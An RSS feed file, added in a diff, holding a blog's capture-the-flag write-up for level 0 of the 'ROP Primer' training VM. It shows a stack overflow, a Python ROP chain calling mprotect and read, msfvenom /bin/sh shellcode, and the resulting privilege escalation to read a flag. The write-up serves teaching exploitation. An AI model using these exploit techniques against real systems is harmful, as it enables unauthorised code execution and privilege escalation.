@@ -1,0 +1,321 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Rop primer on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/rop-primer/</link>
+    <description>Recent content in Rop primer on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 23 Jul 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/rop-primer/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>ROP Primer: Level 0</title>
+      <link>http://rastamouse.me/writeups/2015/rop-primer-level-0/</link>
+      <pubDate>Thu, 23 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/rop-primer-level-0/</guid>
+      <description>
+
+&lt;p&gt;This VM is meant as a small introduction to 32-bit return-oriented-programming on Linux. It contains three vulnerable binaries, that must be exploited using ROP. There are three levels in total (0 to 2).&lt;/p&gt;
+
+&lt;p&gt;The VM is running a webserver with some instructions on how to get started with level0, by SSH’ing in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ ls -l
+
+-rw-r----- 1 level1 level1     25 Jan 20  2015 flag
+-rwsr-xr-x 1 level1 level1 595992 Jan 20  2015 level0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A SUID binary and a flag, both owned by &lt;code&gt;level1&lt;/code&gt;. Exploiting the binary will give us access to the flag, nice and easy.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ ./level0
+[+] ROP tutorial level0
+[+] What&#39;s your name? Rasta Mouse
+[+] Bet you can&#39;t ROP me, Rasta Mouse!
+
+level0@rop:~$ file level0
+level0: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=fb91c352b4d0f9680d22497e348340fe88d0fdf8, not stripped
+
+level0@rop:~$ gdb -q level0
+Reading symbols from level0...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+
+level0@rop:~$ cat /proc/sys/kernel/randomize_va_space
+0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It’s handy that &lt;code&gt;peda&lt;/code&gt; has been installed on the VM, as that should make things a bit easier. The binary is statically linked, compiled with a non-exec stack and ASLR has been disabled.&lt;/p&gt;
+
+&lt;p&gt;We can force the binary into a seg fault by sending it a large input.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python -c &#39;print &amp;quot;A&amp;quot; * 50&#39; | ./level0
+[+] ROP tutorial level0
+[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can find what is getting overwritten in gdb.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python -c &#39;print &amp;quot;A&amp;quot; * 50&#39; &amp;gt; exploit
+
+level0@rop:~$ gdb -q level0
+gdb-peda$ r &amp;lt; exploit
+
+EAX: 0x0
+EBX: 0x0
+ECX: 0xbffff6ac --&amp;gt; 0x80ca720 --&amp;gt; 0xfbad2a84
+EDX: 0x80cb690 --&amp;gt; 0x0
+ESI: 0x80488e0 (&amp;lt;__libc_csu_fini&amp;gt;:  push   ebp)
+EDI: 0x41578b07
+EBP: 0x41414141 (&#39;AAAA&#39;)
+ESP: 0xbffff700 --&amp;gt; 0x4141 (&#39;AA&#39;)
+EIP: 0x41414141 (&#39;AAAA&#39;)
+
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We’ve overwritten EBP and crucially, EIP. Now find the offset.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pattern_create 50
+&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#39;
+
+Stopped reason: SIGSEGV
+0x41414641 in ?? ()
+
+gdb-peda$ pattern_offset 0x41414641
+1094796865 found at offset: 44
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To test this out:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python -c &#39;print &amp;quot;A&amp;quot; * 44 + &amp;quot;BBBB&amp;quot;&#39; &amp;gt; exploit
+gdb-peda$ r &amp;lt; exploit
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is good, as we have accurately targetted EIP. But now what… There are a couple of ways to solve this - one possibility is to construct a complete ROP chain and set the registers up to use an execve syscall. Another is to use some of the handy shortcuts barrebas placed.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;system&lt;/code&gt; is not linked in the binary, but &lt;code&gt;mprotect&lt;/code&gt; and &lt;code&gt;read&lt;/code&gt; are.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ p system
+No symbol table is loaded.
+
+gdb-peda$ p mprotect
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80523e0 &amp;lt;mprotect&amp;gt;
+
+gdb-peda$ p read
+$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80517f0 &amp;lt;read&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can use &lt;code&gt;mprotect&lt;/code&gt; to effectively undo the protection provided by &lt;code&gt;NX&lt;/code&gt;; then &lt;code&gt;read&lt;/code&gt; shellcode in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b main
+gdb-peda$ r
+gdb-peda$ vmmap
+Start      End        Perm    Name
+0x08048000 0x080ca000 r-xp    /home/level0/level0
+0x080ca000 0x080cb000 rw-p    /home/level0/level0
+0x080cb000 0x080ef000 rw-p    [heap]
+0xb7fff000 0xb8000000 r-xp    [vdso]
+0xbffdf000 0xc0000000 rw-p    [stack]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;mprotect:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;mprotect&lt;/h2&gt;
+
+&lt;p&gt;These are the areas of memory, none of which are executable (donated by the &lt;code&gt;x&lt;/code&gt; character). I’m going to make part of the &lt;code&gt;[stack]&lt;/code&gt; region executable, so let’s start building our exploit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#/usr/bin/python
+
+import struct
+
+def p(x):
+        return struct.pack(&#39;&amp;lt;L&#39;, x)
+
+rop = &amp;quot;&amp;quot;
+rop += &amp;quot;A&amp;quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += &amp;quot;FAKE&amp;quot;           # fake ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+print rop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python exploit.py &amp;gt; exploit
+gdb-peda$ r &amp;lt; exploit
+
+Stopped reason: SIGSEGV
+0x454b4146 in ?? ()
+
+gdb-peda$ vmmap
+Start      End        Perm    Name
+0xbffdf000 0xbffe0000 rwxp    mapped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The binary crashes on the &lt;code&gt;FAKE&lt;/code&gt; return address and we can see that the area of memory we specified is now executable. To clear up and prepare for the next step, we should clear those arguments for &lt;code&gt;mprotect&lt;/code&gt; off the stack. A &lt;code&gt;pop3ret&lt;/code&gt; will do the job - to find one we can utilise the &lt;code&gt;ropgadget&lt;/code&gt; in peda.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ ropgadget
+pop3ret = 0x8048882
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let’s use this as the return address for mprotect. For sanities sake, we’ll put a breakpoint there and step through the gadget.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b *0x8048881
+
+Breakpoint 1, 0x08048882 in __libc_setup_tls ()
+
+=&amp;gt; 0x8048882 &amp;lt;__libc_setup_tls+498&amp;gt;:    pop    esi
+   0x8048883 &amp;lt;__libc_setup_tls+499&amp;gt;:    pop    edi
+   0x8048884 &amp;lt;__libc_setup_tls+500&amp;gt;:    pop    ebp
+   0x8048885 &amp;lt;__libc_setup_tls+501&amp;gt;:    ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we run though, EIP eventually seg faults on 0.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
+0x00000000 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can now add a new instruction into the exploit, to ensure we still have control over execution flow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rop = &amp;quot;&amp;quot;
+rop += &amp;quot;A&amp;quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += &amp;quot;BBBB&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+
+0xbffdf000 0xbffe0000 rwxp    mapped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;read:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;read&lt;/h2&gt;
+
+&lt;p&gt;Now we can set up our ROP to &lt;code&gt;read&lt;/code&gt;. This will allow us to read shellcode from &lt;code&gt;stdin&lt;/code&gt; into our mapped area of the stack, and execute.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rop = &amp;quot;&amp;quot;
+rop += &amp;quot;A&amp;quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += p(0x80517f0)     # read
+rop += &amp;quot;FAKE&amp;quot;           # fake ret
+rop += p(0x0)           # stdin
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In setting up read; we specify a fake return again, where to read from (stdin), the area of memory we wish to read into and the amount of memory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
+0x454b4146 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let’s replace the fake return address with the same pop3ret we used earlier. Then write a new block we can segfault on.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rop = &amp;quot;&amp;quot;
+rop += &amp;quot;A&amp;quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += p(0x80517f0)     # read
+rop += p(0x8048882)       # fake ret
+rop += p(0x0)           # stdin
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size 
+
+rop += &amp;quot;BBBB&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;stdin:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;stdin&lt;/h2&gt;
+
+&lt;p&gt;Now we need to test that we can actually read something in from stdin and have it execute. We’ll replace &lt;code&gt;BBBB&lt;/code&gt; with the address of our executable stack location and run the exploit outside gdb.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#/usr/bin/python
+
+import struct
+
+def p(x):
+        return struct.pack(&#39;&amp;lt;L&#39;, x)
+
+rop = &amp;quot;&amp;quot;
+rop += &amp;quot;A&amp;quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += p(0x80517f0)     # read
+rop += p(0x8048882)     # pop3ret 
+rop += p(0x0)           # stdin
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size 
+
+rop += p(0xbffdf000)
+
+print rop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A quick and easy way to test the exploit, is to use a trap. This will stop execution flow just like a breakpoint does in gdb, and we get a message on stdout to let us know it’s happened.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ (python exploit.py; python -c &#39;print &amp;quot;\xcc\xcc&amp;quot;&#39;) | ./level0
+[+] ROP tutorial level0
+[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
+Trace/breakpoint trap
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The final stage is to put some useful shellcode in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali32:~# msfvenom -p linux/x86/exec cmd=/bin/sh -f c | tr -d \&amp;quot; | tr -d &amp;quot;;&amp;quot; | tr -d &#39;\n&#39;
+
+\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ (python exploit.py; python -c &#39;print &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;&#39;; cat) | ./level0
+[+] ROP tutorial level0
+[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
+id
+uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
+whoami
+level1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The additional &lt;code&gt;cat&lt;/code&gt; keeps the shell alive.&lt;/p&gt;
+
+&lt;h2 id=&#34;flag:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat flag
+flag{rop_the_night_away}
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
